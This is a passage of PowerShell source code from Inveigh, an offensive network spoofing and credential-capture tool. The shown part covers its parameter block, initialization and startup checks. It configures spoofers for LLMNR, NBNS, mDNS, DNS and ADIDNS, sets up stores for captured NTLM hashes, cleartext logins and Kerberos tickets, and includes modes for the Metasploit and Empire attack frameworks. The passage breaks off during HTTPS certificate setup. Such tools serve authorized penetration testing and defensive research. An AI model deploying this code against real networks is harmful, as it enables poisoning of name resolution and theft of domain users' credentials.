[parameter(Mandatory=$false)][Array]$KerberosHostHeader = \"\",\n    [parameter(Mandatory=$false)][Array]$ProxyIgnore = \"Firefox\",\n    [parameter(Mandatory=$false)][Array]$PcapTCP = (\"139\",\"445\"),\n    [parameter(Mandatory=$false)][Array]$PcapUDP = \"\",\n    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = \"\",\n    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = \"\",\n    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = \"\",\n    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = \"\",\n    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = \"\",\n    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = \"Firefox\",\n    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = \"-1\",\n    [parameter(Mandatory=$false)][Int]$ConsoleStatus = \"\",\n    [parameter(Mandatory=$false)][Int]$ADIDNSThreshold = \"4\",\n    [parameter(Mandatory=$false)][Int]$ADIDNSTTL = \"600\",\n    [parameter(Mandatory=$false)][Int]$DNSTTL = \"30\",\n    [parameter(Mandatory=$false)][Int]$HTTPPort = \"80\",\n    [parameter(Mandatory=$false)][Int]$HTTPSPort = \"443\",\n    [parameter(Mandatory=$false)][Int]$KerberosCount = \"2\",\n    [parameter(Mandatory=$false)][Int]$LLMNRTTL = \"30\",\n    [parameter(Mandatory=$false)][Int]$mDNSTTL = \"120\",\n    [parameter(Mandatory=$false)][Int]$NBNSTTL = \"165\",\n    [parameter(Mandatory=$false)][Int]$NBNSBruteForcePause = \"\",\n    [parameter(Mandatory=$false)][Int]$ProxyPort = \"8492\",\n    [parameter(Mandatory=$false)][Int]$RunCount = \"\",\n    [parameter(Mandatory=$false)][Int]$RunTime = \"\",\n    [parameter(Mandatory=$false)][Int]$WPADPort = \"\",\n    [parameter(Mandatory=$false)][Int]$SpooferLearningDelay = \"\",\n    [parameter(Mandatory=$false)][Int]$SpooferLearningInterval = \"30\",\n    [parameter(Mandatory=$false)][Int]$SpooferThresholdHost = \"0\",\n    [parameter(Mandatory=$false)][Int]$SpooferThresholdNetwork = \"0\",\n    [parameter(Mandatory=$false)][String]$ADIDNSDomain = \"\",\n    [parameter(Mandatory=$false)][String]$ADIDNSDomainController = \"\",\n    [parameter(Mandatory=$false)][String]$ADIDNSForest = \"\",\n    [parameter(Mandatory=$false)][String]$ADIDNSNS = \"wpad\",\n    [parameter(Mandatory=$false)][String]$ADIDNSNSTarget = \"wpad2\",\n    [parameter(Mandatory=$false)][String]$ADIDNSZone = \"\",\n    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = \"ADFS\",\n    [parameter(Mandatory=$false)][String]$HTTPContentType = \"text/html\",\n    [parameter(Mandatory=$false)][String]$HTTPDefaultFile = \"\",\n    [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = \"\",\n    [parameter(Mandatory=$false)][String]$HTTPResponse = \"\",\n    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = \"Inveigh\",\n    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = \"localhost\",\n    [parameter(Mandatory=$false)][String]$NBNSBruteForceHost = \"WPAD\",\n    [parameter(Mandatory=$false)][String]$WPADResponse = \"function FindProxyForURL(url,host){return `\"DIRECT`\";}\",\n    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = \"\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ConsoleUnique = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Combo\",\"NS\",\"Wildcard\")][Array]$ADIDNS,\n    [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\",\"System\")][String]$ADIDNSPartition = \"DomainDNSZones\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ADIDNSACE = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ADIDNSCleanup = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$DNS = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$EvadeRG = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$FileOutput = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$FileUnique = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTP = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTPS = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTPSForceCertDelete = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$Kerberos = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$LLMNR = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$LogOutput = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$MachineAccounts = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$mDNS = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$NBNS = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$NBNSBruteForce = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$OutputStreamOnly = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$Proxy = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ShowHelp = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$SMB = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$SpooferLearning = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$SpooferNonprintable = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$SpooferRepeat = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$StatusOutput = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$StartupChecks = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\",\"Low\",\"Medium\")][String]$ConsoleOutput = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Auto\",\"Y\",\"N\")][String]$Elevated = \"Auto\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Anonymous\",\"Basic\",\"NTLM\",\"NTLMNoESS\")][String]$HTTPAuth = \"NTLM\",\n    [parameter(Mandatory=$false)][ValidateSet(\"QU\",\"QM\")][Array]$mDNSTypes = @(\"QU\"),\n    [parameter(Mandatory=$false)][ValidateSet(\"00\",\"03\",\"20\",\"1B\",\"1C\",\"1D\",\"1E\")][Array]$NBNSTypes = @(\"00\",\"20\"),\n    [parameter(Mandatory=$false)][ValidateSet(\"File\",\"Memory\")][String]$Pcap = \"\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Basic\",\"NTLM\",\"NTLMNoESS\")][String]$ProxyAuth = \"NTLM\",\n    [parameter(Mandatory=$false)][ValidateSet(\"0\",\"1\",\"2\")][String]$Tool = \"0\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Anonymous\",\"Basic\",\"NTLM\",\"NTLMNoESS\")][String]$WPADAuth = \"NTLM\",\n    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$KerberosHash,\n    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDirectory = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = \"0.0.0.0\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = \"0.0.0.0\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = \"\",\n    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$ADIDNSCredential,\n    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$KerberosCredential,\n    [parameter(Mandatory=$false)][Switch]$Inspect,\n    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n)\n\n#endregion\n#region begin initialization\nif($invalid_parameter)\n{\n    Write-Output \"[-] $($invalid_parameter) is not a valid parameter\"\n    throw\n}\n\n$inveigh_version = \"1.506\"\n\nif(!$IP)\n{ \n\n    try\n    {\n        $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)\n    }\n    catch\n    {\n        Write-Output \"[-] Error finding local IP, specify manually with -IP\"\n        throw\n    }\n\n}\n\nif(!$SpooferIP)\n{\n    $SpooferIP = $IP\n}\n\nif($ADIDNS)\n{\n\n    if(!$ADIDNSDomainController -or !$ADIDNSDomain -or $ADIDNSForest -or !$ADIDNSZone)\n    {\n\n        try\n        {\n            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n        }\n        catch\n        {\n            Write-Output \"[-] $($_.Exception.Message)\"\n            throw\n        }\n\n        if(!$ADIDNSDomainController)\n        {\n            $ADIDNSDomainController = $current_domain.PdcRoleOwner.Name\n        }\n    \n        if(!$ADIDNSDomain)\n        {\n            $ADIDNSDomain = $current_domain.Name\n        }\n\n        if(!$ADIDNSForest)\n        {\n            $ADIDNSForest = $current_domain.Forest\n        }\n    \n        if(!$ADIDNSZone)\n        {\n            $ADIDNSZone = $current_domain.Name\n        }\n\n    }\n\n}\n\nif($HTTPDefaultFile -or $HTTPDefaultEXE)\n{\n\n    if(!$HTTPDirectory)\n    {\n        Write-Output \"[-] You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE\"\n        throw\n    }\n\n}\n\nif($Kerberos -eq 'Y' -and !$KerberosCredential -and !$KerberosHash)\n{\n    Write-Output \"[-] You must specify a -KerberosCredential or -KerberosHash when enabling Kerberos capture\"\n    throw\n}\n\nif($WPADIP -or $WPADPort)\n{\n\n    if(!$WPADIP)\n    {\n        Write-Output \"[-] You must specify a -WPADPort to go with -WPADIP\"\n        throw\n    }\n\n    if(!$WPADPort)\n    {\n        Write-Output \"[-] You must specify a -WPADIP to go with -WPADPort\"\n        throw\n    }\n\n}\n\nif($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)\n{\n    Write-Output \"[-] You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce\"\n    throw\n}\n\nif(!$FileOutputDirectory)\n{ \n    $output_directory = $PWD.Path\n}\nelse\n{\n    $output_directory = $FileOutputDirectory\n}\n\nif(!$inveigh)\n{\n    $global:inveigh = [HashTable]::Synchronized(@{})\n    $inveigh.cleartext_list = New-Object System.Collections.ArrayList\n    $inveigh.enumerate = New-Object System.Collections.ArrayList\n    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList\n    $inveigh.log = New-Object System.Collections.ArrayList\n    $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList\n    $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList\n    $inveigh.POST_request_list = New-Object System.Collections.ArrayList\n    $inveigh.valid_host_list = New-Object System.Collections.ArrayList\n    $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_history_table = [HashTable]::Synchronized(@{})\n    $inveigh.request_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_socket_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_lock_table = [HashTable]::Synchronized(@{})\n    $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})\n    $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})\n    $inveigh.group_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_count = 0\n    $inveigh.session = @()\n}\n\nif($inveigh.running)\n{\n    Write-Output \"[-] Inveigh is already running\"\n    throw\n}\n\n$inveigh.stop = $false\n\nif(!$inveigh.relay_running)\n{\n    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.console_queue = New-Object System.Collections.ArrayList\n    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList\n    $inveigh.log_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.output_queue = New-Object System.Collections.ArrayList\n    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.HTTP_session_table = [HashTable]::Synchronized(@{})\n    $inveigh.console_input = $true\n    $inveigh.console_output = $false\n    $inveigh.file_output = $false\n    $inveigh.HTTPS_existing_certificate = $false\n    $inveigh.HTTPS_force_certificate_delete = $false\n    $inveigh.log_output = $true\n    $inveigh.cleartext_out_file = $output_directory + \"\\Inveigh-Cleartext.txt\"\n    $inveigh.log_out_file = $output_directory + \"\\Inveigh-Log.txt\"\n    $inveigh.NTLMv1_out_file = $output_directory + \"\\Inveigh-NTLMv1.txt\"\n    $inveigh.NTLMv2_out_file = $output_directory + \"\\Inveigh-NTLMv2.txt\"\n    $inveigh.POST_request_out_file = $output_directory + \"\\Inveigh-FormInput.txt\"\n}\n\nif($Elevated -eq 'Auto')\n{\n    $elevated_privilege = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match \"S-1-5-32-544\")\n}\nelse\n{\n \n    if($Elevated -eq 'Y')\n    {\n        $elevated_privilege_check = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match \"S-1-5-32-544\")\n        $elevated_privilege = $true\n    }\n    else\n    {\n        $elevated_privilege = $false\n    }\n    \n}\n\nif($StartupChecks -eq 'Y')\n{\n\n    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}\n\n    if($HTTP -eq 'Y')\n    {\n        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$HTTPPort \"\n    }\n\n    if($HTTPS -eq 'Y')\n    {\n        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$HTTPSPort \"\n    }\n\n    if($Proxy -eq 'Y')\n    {\n        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$ProxyPort \"\n    }\n\n    if($DNS -eq 'Y' -and !$elevated_privilege)\n    {\n        $DNS_port_check = netstat -anp UDP | findstr /C:\"0.0.0.0:53 \"\n        $DNS_port_check = $false\n    }\n\n    if($LLMNR -eq 'Y' -and !$elevated_privilege)\n    {\n        $LLMNR_port_check = netstat -anp UDP | findstr /C:\"0.0.0.0:5355 \"\n        $LLMNR_port_check = $false\n    }\n\n    if($mDNS -eq 'Y' -and !$elevated_privilege)\n    {\n        $mDNS_port_check = netstat -anp UDP | findstr /C:\"0.0.0.0:5353 \"\n    }\n\n}\n\nif(!$elevated_privilege)\n{\n\n    if($HTTPS -eq 'Y')\n    {\n        Write-Output \"[-] HTTPS requires elevated privileges\"\n        throw\n    }\n\n    if($SpooferLearning -eq 'Y')\n    {\n        Write-Output \"[-] SpooferLearning requires elevated privileges\"\n        throw\n    }\n\n    if($Pcap -eq 'File')\n    {\n        Write-Output \"[-] Pcap file output requires elevated privileges\"\n        throw\n    }\n\n    if(!$PSBoundParameters.ContainsKey('NBNS'))\n    {\n        $NBNS = \"Y\"\n    }\n\n    $SMB = \"N\"\n}\n\n$inveigh.hostname_spoof = $false\n$inveigh.running = $true\n\nif($StatusOutput -eq 'Y')\n{\n    $inveigh.status_output = $true\n}\nelse\n{\n    $inveigh.status_output = $false\n}\n\nif($OutputStreamOnly -eq 'Y')\n{\n    $inveigh.output_stream_only = $true\n}\nelse\n{\n    $inveigh.output_stream_only = $false\n}\n\nif($Inspect)\n{\n\n    if($elevated_privilege)\n    {\n        $DNS = \"N\"\n        $LLMNR = \"N\"\n        $mDNS = \"N\"\n        $NBNS = \"N\"\n        $HTTP = \"N\"\n        $HTTPS = \"N\"\n        $Proxy = \"N\"\n    }\n    else\n    {\n        $HTTP = \"N\"\n        $HTTPS = \"N\"\n        $Proxy = \"N\"\n    }\n\n}\n\nif($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension\n{\n    $inveigh.tool = 1\n    $inveigh.output_stream_only = $true\n    $inveigh.newline = $null\n    $ConsoleOutput = \"N\"\n\n}\nelseif($Tool -eq 2) # PowerShell Empire\n{\n    $inveigh.tool = 2\n    $inveigh.output_stream_only = $true\n    $inveigh.console_input = $false\n    $inveigh.newline = $null\n    $LogOutput = \"N\"\n    $ShowHelp = \"N\"\n\n    switch ($ConsoleOutput)\n    {\n\n        'Low'\n        {\n            $ConsoleOutput = \"Low\"\n        }\n\n        'Medium'\n        {\n            $ConsoleOutput = \"Medium\"\n        }\n\n        default\n        {\n            $ConsoleOutput = \"Y\"\n        }\n\n    }\n\n}\nelse\n{\n    $inveigh.tool = 0\n    $inveigh.newline = $null\n}\n\n$inveigh.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value\n$inveigh.computer_name = (Get-ChildItem -path env:computername).Value\n\ntry\n{\n    $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()\n    $inveigh.DNS_computer_name = ($inveigh.computer_name + \".\" + $inveigh.DNS_domain).ToLower()\n\n    if(!$inveigh.domain_mapping_table.($inveigh.netBIOS_domain))\n    {\n        $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)\n    }\n\n}\ncatch\n{\n    $inveigh.DNS_domain = $inveigh.netBIOS_domain\n    $inveigh.DNS_computer_name = $inveigh.computer_name\n}\n\n#endregion\n#region begin startup messages\n$inveigh.output_queue.Add(\"[*] Inveigh $inveigh_version started at $(Get-Date -format s)\") > $null\n\nif($Elevated -eq 'Y' -or $elevated_privilege)\n{\n\n    if(($Elevated -eq 'Auto' -and $elevated_privilege) -or ($Elevated -eq 'Y' -and $elevated_privilege_check))\n    {\n        $inveigh.output_queue.Add(\"[+] Elevated Privilege Mode = Enabled\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[-] Elevated Privilege Mode Enabled But Check Failed\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[!] Elevated Privilege Mode = Disabled\")  > $null\n    $SMB = \"N\"\n}\n\nif($firewall_status)\n{\n    $inveigh.output_queue.Add(\"[!] Windows Firewall = Enabled\")  > $null\n}\n\n$inveigh.output_queue.Add(\"[+] Primary IP Address = $IP\")  > $null\n\nif($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer IP Address = $SpooferIP\")  > $null\n}\n\nif($LLMNR -eq 'Y' -or $NBNS -eq 'Y')\n{\n\n    if($SpooferThresholdHost -gt 0)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Threshold Host = $SpooferThresholdHost\")  > $null\n    }\n\n    if($SpooferThresholdNetwork -gt 0)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Threshold Network = $SpooferThresholdNetwork\")  > $null\n    }\n    \n}\n\nif($ADIDNS)\n{\n    $inveigh.ADIDNS = $ADIDNS\n    $inveigh.output_queue.Add(\"[+] ADIDNS Spoofer = $ADIDNS\")  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS Hosts Ignore = \" + ($ADIDNSHostsIgnore -join \",\"))  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS Domain Controller = $ADIDNSDomainController\")  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS Domain = $ADIDNSDomain\")  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS Forest = $ADIDNSForest\")  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS TTL = $ADIDNSTTL\")  > $null\n    $inveigh.output_queue.Add(\"[+] ADIDNS Zone = $ADIDNSZone\")  > $null\n\n    if($inveigh.ADIDNS -contains 'NS')\n    {\n        $inveigh.output_queue.Add(\"[+] ADIDNS NS Record = $ADIDNSNS\")  > $null\n        $inveigh.output_queue.Add(\"[+] ADIDNS NS Target Record = $ADIDNSNSTarget\")  > $null\n    }\n\n    if($ADIDNSACE -eq 'Y')\n    {\n        $inveigh.output_queue.Add(\"[+] ADIDNS ACE Add = Enabled\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] ADIDNS ACE Add = Disabled\")  > $null    \n    }\n\n    if($ADIDNSCleanup -eq 'Y')\n    {\n        $inveigh.output_queue.Add(\"[+] ADIDNS Cleanup = Enabled\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] ADIDNS Cleanup = Disabled\")  > $null    \n    }\n\n    if($ADIDNS -eq 'Combo')\n    {\n        $inveigh.request_table_updated = $true\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] ADIDNS Spoofer = Disabled\")  > $null\n}\n\nif($DNS -eq 'Y')\n{\n\n    if($elevated_privilege -or !$DNS_port_check)\n    {\n        $inveigh.output_queue.Add(\"[+] DNS Spoofer = Enabled\")  > $null\n        $inveigh.output_queue.Add(\"[+] DNS TTL = $DNSTTL Seconds\")  > $null\n    }\n    else\n    {\n        $DNS = \"N\"\n        $inveigh.output_queue.Add(\"[-] DNS Spoofer Disabled Due To In Use Port 53\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] DNS Spoofer = Disabled\")  > $null\n}\n\nif($LLMNR -eq 'Y')\n{\n\n    if($elevated_privilege -or !$LLMNR_port_check)\n    {\n        $inveigh.output_queue.Add(\"[+] LLMNR Spoofer = Enabled\")  > $null\n        $inveigh.output_queue.Add(\"[+] LLMNR TTL = $LLMNRTTL Seconds\")  > $null\n    }\n    else\n    {\n        $LLMNR = \"N\"\n        $inveigh.output_queue.Add(\"[-] LLMNR Spoofer Disabled Due To In Use Port 5355\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] LLMNR Spoofer = Disabled\")  > $null\n}\n\nif($mDNS -eq 'Y')\n{\n\n    if($elevated_privilege -or !$mDNS_port_check)\n    {\n        $mDNSTypes_output = $mDNSTypes -join \",\"\n\n        if($mDNSTypes.Count -eq 1)\n        {\n            $inveigh.output_queue.Add(\"[+] mDNS Spoofer For Type $mDNSTypes_output = Enabled\")  > $null\n        }\n        else\n        {\n            $inveigh.output_queue.Add(\"[+] mDNS Spoofer For Types $mDNSTypes_output = Enabled\")  > $null\n        }\n\n        $inveigh.output_queue.Add(\"[+] mDNS TTL = $mDNSTTL Seconds\")  > $null\n    }\n    else\n    {\n        $mDNS = \"N\"\n        $inveigh.output_queue.Add(\"[-] mDNS Spoofer Disabled Due To In Use Port 5353\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] mDNS Spoofer = Disabled\")  > $null\n}\n\nif($NBNS -eq 'Y')\n{\n    $NBNSTypes_output = $NBNSTypes -join \",\"\n    \n    if($NBNSTypes.Count -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] NBNS Spoofer For Type $NBNSTypes_output = Enabled\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] NBNS Spoofer For Types $NBNSTypes_output = Enabled\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] NBNS Spoofer = Disabled\")  > $null\n}\n\nif($NBNSBruteForce -eq 'Y')\n{   \n    $inveigh.output_queue.Add(\"[+] NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget\") > $null\n    $inveigh.output_queue.Add(\"[+] NBNS Brute Force Spoofer IP Address = $SpooferIP\") > $null\n    $inveigh.output_queue.Add(\"[+] NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost\") > $null\n\n    if($NBNSBruteForcePause)\n    {\n        $inveigh.output_queue.Add(\"[+] NBNS Brute Force Pause = $NBNSBruteForcePause Seconds\") > $null\n    }\n\n}\n\nif($NBNS -eq 'Y' -or $NBNSBruteForce -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] NBNS TTL = $NBNSTTL Seconds\") > $null\n}\n\nif($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer Learning = Enabled\")  > $null\n\n    if($SpooferLearningDelay -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Learning Delay = $SpooferLearningDelay Minute\")  > $null\n    }\n    elseif($SpooferLearningDelay -gt 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Learning Delay = $SpooferLearningDelay Minutes\")  > $null\n    }\n    \n    if($SpooferLearningInterval -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Learning Interval = $SpooferLearningInterval Minute\")  > $null\n    }\n    elseif($SpooferLearningInterval -eq 0)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Learning Interval = Disabled\")  > $null\n    }\n    elseif($SpooferLearningInterval -gt 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Spoofer Learning Interval = $SpooferLearningInterval Minutes\")  > $null\n    }\n\n}\n\nif($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer Hosts Reply = \" + ($SpooferHostsReply -join \",\"))  > $null\n}\n\nif($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer Hosts Ignore = \" + ($SpooferHostsIgnore -join \",\"))  > $null\n}\n\nif($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer IPs Reply = \" + ($SpooferIPsReply -join \",\"))  > $null\n}\n\nif($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))\n{\n    $inveigh.output_queue.Add(\"[+] Spoofer IPs Ignore = \" + ($SpooferIPsIgnore -join \",\"))  > $null\n}\n\nif($SpooferRepeat -eq 'N')\n{\n    $inveigh.spoofer_repeat = $false\n    $inveigh.output_queue.Add(\"[+] Spoofer Repeating = Disabled\")  > $null\n}\nelse\n{\n    $inveigh.spoofer_repeat = $true\n}\n\nif($SMB -eq 'Y' -and $elevated_privilege)\n{\n    $inveigh.output_queue.Add(\"[+] SMB Capture = Enabled\")  > $null\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] SMB Capture = Disabled\")  > $null\n}\n\nif($HTTP -eq 'Y')\n{\n\n    if($HTTP_port_check)\n    {\n        $HTTP = \"N\"\n        $inveigh.output_queue.Add(\"[-] HTTP Capture Disabled Due To In Use Port $HTTPPort\")  > $null\n    }\n    else\n    {\n\n        if($HTTPIP -ne '0.0.0.0')\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP IP = $HTTPIP\") > $null\n        }\n\n        if($HTTPPort -ne 80)\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP Port = $HTTPPort\") > $null\n        }\n\n        $inveigh.output_queue.Add(\"[+] HTTP Capture = Enabled\")  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] HTTP Capture = Disabled\")  > $null\n}\n\nif($HTTPS -eq 'Y')\n{\n\n    if($HTTPS_port_check)\n    {\n        $HTTPS = \"N\"\n        $inveigh.HTTPS = $false\n        $inveigh.output_queue.Add(\"[-] HTTPS Capture Disabled Due To In Use Port $HTTPSPort\")  > $null\n    }\n    else\n    {\n\n        try\n        { \n            $inveigh.certificate_issuer = $HTTPSCertIssuer\n            $inveigh.certificate_CN = $HTTPSCertSubject\n            $inveigh.output_queue.Add(\"[+] HTTPS Certificate Issuer = \" + $inveigh.certificate_issuer)  > $null\n            $inveigh.output_queue.Add(\"[+] HTTPS Certificate CN = \" + $inveigh.certificate_CN)  > $null\n            $certificate_check = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -Like \"CN=\" + $inveigh.certificate_issuer})\n\n            if(!$certificate_check)\n            {\n                # credit to subTee for cert creation code from Interceptor\n                $certificate_distinguished_name = new-object -com \"X509Enrollment.CX500DistinguishedName\"\n                $certificate_distinguished_name.Encode( \"CN=\" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)\n                